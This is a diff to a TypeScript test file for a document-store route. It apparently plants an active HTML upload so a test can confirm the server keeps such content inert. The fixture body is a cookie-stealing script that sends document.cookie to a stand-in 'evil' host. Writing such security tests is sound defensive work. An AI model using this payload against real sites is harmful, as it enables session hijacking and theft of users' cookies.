@@ -87,10 +87,25 @@ const EGRESS_ROUTES: Egress[] = [
   },
   {
     name: "/f/:id (document store)",
-    // /f streams from R2, which vitest-pool-workers' isolatedStorage can't run.
-    // When DOCUMENTS is absent (CI default) it returns 404, so it can't be driven
-    // live here; the helper-level assertion below proves serveDocument's headers.
-    setup: async () => (env as any).DOCUMENTS ? "/f/1" : null,
+    // Drivable only when the DOCUMENTS binding exists (absent by default/CI;
+    // locally simulated R2 in the vitest pool once enabled). Plants an ACTIVE
+    // text/html document through the real two-step upload, then serves it. When
+    // the binding is absent the helper-level assertion below still proves
+    // serveDocument's headers over every active MIME.
+    setup: async (hive) => {
+      if (!(env as any).DOCUMENTS) return null;
+      const doc = JSON.parse(await hive.mutate("_documents", "create", JSON.stringify({
+        title: "inert-f", visibility: "public",
+      })));
+      if (doc.error) throw new Error(`document create failed: ${doc.message}`);
+      const up = await SELF.fetch(`https://test.local/f/${doc.upload_token}`, {
+        method: "POST",
+        headers: { "Content-Type": "text/html" },
+        body: "<script>document.location='//evil/?'+document.cookie</script>",
+      });
+      if (up.status !== 201) throw new Error(`document upload failed: ${up.status}`);
+      return `/f/${doc.entry.id}`;
+    },
   },
 ];
 
